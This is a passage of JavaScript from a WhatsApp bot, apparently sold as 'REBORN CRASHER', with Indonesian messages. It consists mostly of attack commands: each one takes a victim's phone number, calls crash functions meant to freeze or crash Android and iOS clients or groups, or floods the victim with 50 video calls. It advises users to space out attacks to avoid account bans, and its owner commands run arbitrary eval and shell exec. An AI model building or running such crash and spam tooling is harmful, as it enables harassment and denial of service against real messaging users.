reply(`*Cara Pakai* : ${prefix + command} 628xxx`)
} else {
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`Nomor Dimulai Dengan Angka 0. Gantilah Dengan Nomor Yang Berawalan Kode Negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let proses = `*[V15] Memproses Pengiriman Bug, Tunggu Selama 1 Atau 3 Menit, Jangan Spam!*`
let done = `*[V15 Justin]* Succes Attack!✔

Target : ${pepec}
Bug Command : ${command}
Version : 15.0.0
Type Script : Base Button New

> Gunakan Jeda Selama 15 / 20 Menit,Agar Tidak Kenon!
`
if (target === blockedNum) {
	reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');
	} else {
        await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
        Justinn.sendMessage(m.chat, {
  image: marah,
  caption: proses,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
await sleep(2500)
		try{

{
CrashAndroX(target)
}
            await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
            Justinn.sendMessage(m.chat, {
  image: marah,
  caption: done,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

case 'Crash-ui':
case 'Titan-Attack':
case 'Virus-Blank':
case 'Void-infinity':
case 'Fuck-Blood':
case 'Lotus-Crash':
case 'Valentine-Gift':
case 'XCall-Crash':
case 'Hard-Ware':
case 'Baned-Ch': { // BUG HARD

if (!isPremium && !isOwner && !isUnli) return reply(mess.premium)
if (!q) {
reply(`*Cara Pakai* : ${prefix + command} 628xxx`)
} else {
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`Nomor Dimulai Dengan Angka 0. Gantilah Dengan Nomor Yang Berawalan Kode Negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let proses = `*[V15] Memproses Pengiriman Bug, Tunggu Selama 1 Atau 3 Menit, Jangan Spam!*`
let done = `*[V15 Justin]* Succes Attack!✔

Target : ${pepec}
Bug Command : ${command}
Version : 15.0.0
Type Script : Base Button New

> Gunakan Jeda Selama 5 / 10 Menit,Agar Tidak Kenon!
`
if (target === blockedNum) {
	reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');
	} else {
        await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
        Justinn.sendMessage(m.chat, {
  image: marah,
  caption: proses,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
await sleep(2500)
		try{

{

CrashAndro(target)
}
            await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
            Justinn.sendMessage(m.chat, {
  image: marah,
  caption: done,
  footer: "© Developer Justin",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

//IOS
case 'darkness':
case 'chaos':
case 'carnage':
case 'massacre':
case 'mayhem':
case 'havoc':
case 'abolish': {
// BUG HARD
}

if (!isPremium && !isOwner && !isUnli) return reply(mess.premium)
if (!q) {
reply(`*Cara Pakai* : ${prefix + command} 628xxx`)
} else {
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`Nomor Dimulai Dengan Angka 0. Gantilah Dengan Nomor Yang Berawalan Kode Negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let proses = `*[V15] Memproses Pengiriman Bug, Tunggu Selama 1 Atau 3 Menit, Jangan Spam!*`
let done = `*[V15 Justin]* Succes Attack!✔

Target : ${pepec}
Bug Command : ${command}
Version : 15.0.0 
Type Script : Base Button New

> Gunakan Jeda Selama 5 / 10 Menit,Agar Tidak Kenon!`
if (target === blockedNum) {
	reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');
	} else {
        await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
        Justinn.sendMessage(m.chat, {
  image: marah,
  caption: proses,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
await sleep(2500)
		try{

{

CrashAndro(target)
}
            await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
            Justinn.sendMessage(m.chat, {
  image: marah,
  caption: done,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

//ANDRO
case 'special-forceclose':
case 'special-crashmaster':
case 'special-invisiblity':
case 'special-blankpage':
case 'special-attackmode':
case 'special-killswitch':
case 'special-uioverwrite':
case 'special-killsystem':
case 'special-overpower':
case 'special-chaosmode': {
// BUG SPECIAL
}

if (!isPremium && !isOwner && !isUnli) return reply(mess.premium)
if (!q) {
reply(`*Cara Pakai* : ${prefix + command} 628xxx`)
} else {
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`Nomor Dimulai Dengan Angka 0. Gantilah Dengan Nomor Yang Berawalan Kode Negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let proses = `*[V15] Memproses Pengiriman Bug, Tunggu Selama 1 Atau 3 Menit, Jangan Spam!*`
let done = `*[V15 Justin]* Succes Attack!✔

Target : ${pepec}
Bug Command : ${command}
Version : 15.0.0 
Type Script : Base Button New

> Gunakan Jeda Selama 5 / 10 Menit,Agar Tidak Kenon!`
if (target === blockedNum) {
	reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');
	} else {
        await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
        Justinn.sendMessage(m.chat, {
  image: marah,
  caption: proses,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
await sleep(2500)
		try{

{

CrashMedium(target)
}
            await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
            Justinn.sendMessage(m.chat, {
  image: marah,
  caption: done,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

//IOS
case 'justin-hardios': 
case 'justin-hardblankios': 
case 'justin-hardattackios': 
case 'justin-frezeeios':
case 'justin-outios':
case 'justin-hardcrashios':
case 'justin-hardinvisios': { // BUG MEDIUM

if (!isPremium && !isOwner && !isUnli) return reply(mess.premium)
if (!q) {
reply(`*Cara Pakai* : ${prefix + command} 628xxx`)
} else {
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`Nomor Dimulai Dengan Angka 0. Gantilah Dengan Nomor Yang Berawalan Kode Negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let proses = `*[V15] Memproses Pengiriman Bug, Tunggu Selama 1 Atau 3 Menit, Jangan Spam!*`
let done = `*[V15 Justin]* Succes Attack!✔

Target : ${pepec}
Bug Command : ${command}
Version : 15.0.0 
Type Script : Base Button New

> Gunakan Jeda Selama 5 / 10 Menit,Agar Tidak Kenon!`
if (target === blockedNum) {
	reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');
	} else {
        await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
        Justinn.sendMessage(m.chat, {
  image: marah,
  caption: proses,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
await sleep(2500)
		try{

{

CrashMedium(target)
}
            await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
            Justinn.sendMessage(m.chat, {
  image: marah,
  caption: done,
  footer: "© Developer JustinOfficial",
  buttons: [
  {
    buttonId: ".buysc", 
    buttonText: { 
      displayText: 'Buy Script' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: qmime });
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break


case 'x-gcui': {

if (!isPremium && !isOwner ) return reply(mess.premium)

{
CrashGroup(m.chat)
    }
}
break       
async function sendOfferVideoCall(target) {
    try {
        await Justinn.OfferVideoCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Group`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Group:`, error));
    }
}
               
 case 'spamcall': { // BUG BIASA

if (!isPrem) return reply(`*Only Premium Member Akses*`)
if (!q) {
reply(`Example : ${prefix + command} 628xxx`)
} else {
const blockedNum = '6283148534432@s.whatsapp.net';
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`• Nomor Dimulai Dengan Angka 0. Gantilah Dengan Nomor Yang Berawalan Kode Negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
if (target === blockedNum) {
	reply('Mau *SpamCall* Ke Developer? Gabakalan Gw Jalanin Perintah Lu Kocak😹');
	} else {
		try{
await Justinn.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}}), 
await loading()
await sleep(1500)
await Justinn.sendMessage(m.chat, { react: { text: "😈",key: m.key,}}); 
            reply(`*[V15 Justin]* Succes Attack!✔

Target : ${pepec}
Bug Command : ${command}

> Gunakan Jeda Selama 5 / 10 Menit,Agar Tidak Kenon!`) 
            Justinn.sendMessage(target, {text: `mass`})
for (let i = 0; i < 50; i++) {
await sendOfferVideoCall(target)
await sleep(5000)
}
            

} catch (err) {
    console.erorr(err);
    }
}
}
    }
break
            case 'hai': case 'salken': case 'dimana': case 'sulap': {
    
   if (!isPrem) return reply(`*[V15 Justin]* Only Owner!`)
    reply(`*[V15 Justin]* Sukses Spam Sender!`)
    {
    await CrashAndro(m.chat)
        }
    }
                break
 
 //======================[ END BUG MENU ]===============================================================//

//======================[ OWNER MENU ]===============================================================//

case "addown":{
           
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Nomer\nContoh ${prefix+command} 6283148534432`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Justinn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
owners.push(prrkek)
fs.writeFileSync("./Internal/database/own.json", JSON.stringify(owners))
reply(`*[V15 Justin]* Sukses Add Owner!

Nomer : ${prrkek}
Script Bot : ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ
Buy Script : 2347019170750
Type Script : Base Button New
`)
`)
}
break
case "delown":{
   
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Nomer\nContoh ${prefix+command} 6283148534432`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerNumber.indexOf(bro)
ownerNumber.splice(unp, 1)
fs.writeFileSync("./Internal/database/owner.json", JSON.stringify(ownerNumber))
reply(`Nomor ${bro} Telah Di Hapus Owner!`)
}
break
        case "addmurbug":{
            
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Nomer\nContoh ${prefix+command} 6283148534432`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Justinn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
prem.push(prrkek)
fs.writeFileSync("./Internal/database/premium.json", JSON.stringify(prem))
reply(`*[V15 Justin]* Sukses Add Akses!

Nomer : ${prrkek}
Script Bot : ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ
Buy Script : 2347019170750
Type Script : Base Button New
`)
}
break
        case "delmurbug":{
            
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Nomer\nContoh ${prefix+command} 6283148534432`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(bro)
prem.splice(unp, 1)
fs.writeFileSync("./Internal/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${bro} Telah Di Hapus Murbug!`)
}
break
        case 'addgcmurbug':

if (!isOwner) return 
if (!isGroup) return reply("Lakukan Didalem Grup!")
if (!isOwner) return reply(mess.owner)
unli.push(m.chat)
fs.writeFileSync('./Internal/database/unli.json', JSON.stringify(unli))
reply(`*[ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ]* Seluruh Member Grup, Sudah Dapat Mengakses Bot ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ!`)
break
case "delgcmurbug":{
  
if (!isGroup) return reply("Lakukan Didalam Grup!")
if (!isOwner) return reply(mess.owner)
unli.splice(m.chat)
fs.writeFileSync("./Internal/database/unli.json", JSON.stringify(unli))
reply(`*[ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ]* Seluruh Member Grup Kini Tidak Dapat Mengakses Bot ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ, Silahkan Chat Owner Bot Untuk Membeli Akses!`)
}
break
//======================[ END OWNER MENU ]===============================================================//

    // END            
			default:
			if (body.startsWith("<")) {
                if (!isOwner) return;
                try {
                    const output = await eval(`(async () => ${q})()`);
                    await m.reply(`${typeof output === 'string' ? output : JSON.stringify(output, null, 4)}`);
                } catch (e) {
                    await m.reply(`Error: ${String(e)}`);
                }
            }
			if (budy.startsWith(">")) {
			if (!isOwner) return
				try {
					let evaled = await eval(q);
					if (typeof evaled !== "string") evaled = util.inspect(evaled);
					await m.reply(evaled);
				} catch (e) {
					await m.reply(`Error: ${String(e)}`);
				}
			}
			if (budy.startsWith("$")) {
			if (!isOwner) return
				exec(q,
					(err, stdout) => {
						if (err) return m.reply(err.toString());
						if (stdout) return m.reply(stdout.toString());
				})
				}
		}
		
	} catch (e) {
		console.log(e) // Jangan Diganti Biar Dev Tau Ada Fitur Yang Error //
	//	Justinn.sendMessage("2347029170750@s.whatsapp.net", {text: "Hi Developer Mexican👋, Ada Fitur Vip Yang Error Nih!\n\n" + util.format(e)}) // Ganti? Tanggung sendiri kalo ada banyak error yang ga ke fix di update selanjutnya //
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	exec(`Update ${__filename}`)
	console.log(`File ${__filename} Has Been Updated!!`)
	delete require.cache[file]
	require(file)
})
